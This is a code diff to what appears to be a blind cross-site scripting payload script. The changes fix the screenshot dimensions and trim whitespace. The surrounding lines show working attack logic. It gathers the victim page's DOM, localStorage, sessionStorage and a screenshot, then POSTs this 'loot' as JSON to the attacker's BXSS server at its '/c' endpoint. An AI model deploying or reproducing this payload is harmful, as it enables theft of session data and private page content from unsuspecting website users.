@@ -12,7 +12,7 @@ function return_value(value) {
 
 function screenshot() {
   return new Promise(function (resolve, reject) {
-    html2canvas(document.querySelector("html"), { letterRendering: 1, allowTaint: true, useCORS: true}).then(function (canvas) {
+    html2canvas(document.querySelector("html"), { letterRendering: 1, allowTaint: true, useCORS: true, width: 1024, height: 768}).then(function (canvas) {
         resolve(return_value(canvas.toDataURL())) // png in dataURL format
     });
   });
@@ -33,7 +33,7 @@ function collect_data() {
     collected_data["DOM"] = collected_data["DOM"].slice(0, 8192)
     try { collected_data["localStorage"] = return_value(localStorage.toSource()); } catch(e) {}
     try { collected_data["sessionStorage"] = return_value(sessionStorage.toSource()); } catch(e) {}
-    try { 
+    try {
       screenshot().then(function(img) {
         collected_data["Screenshot"] = img
         resolve(collected_data)
@@ -49,7 +49,7 @@ function exfiltrate_loot() {
   // Get the URI of our BXSS server
   var uri = new URL(curScript.src);
   var exf_url = uri.origin + "/c"
-  
+
   var xhr = new XMLHttpRequest()
   xhr.open("POST", exf_url, true)
   xhr.setRequestHeader("Content-Type", "application/json")
